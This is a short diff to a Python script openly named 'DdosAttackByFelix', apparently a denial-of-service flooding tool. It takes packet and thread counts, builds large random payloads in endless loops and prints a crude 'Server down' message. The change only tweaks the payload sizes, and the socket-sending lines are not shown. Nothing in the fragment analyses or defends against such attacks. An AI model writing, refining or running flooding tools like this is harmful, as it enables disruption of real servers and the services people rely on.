@@ -13,7 +13,7 @@ choice = str(input(" DdosAttackByFelix | Gas Gak Ni?(y/n):"))
 times = int(input(" DdosAttackByFelix | Packets:"))
 threads = int(input(" DdosAttackByFelix | Threads:"))
 def run():
-	data = random._urandom(100000)
+	data = random._urandom(99999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -26,7 +26,7 @@ def run():
 			print("[!] | Server down kontol!!! |")
 
 def run2():
-	data = random._urandom(1000)
+	data = random._urandom(999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
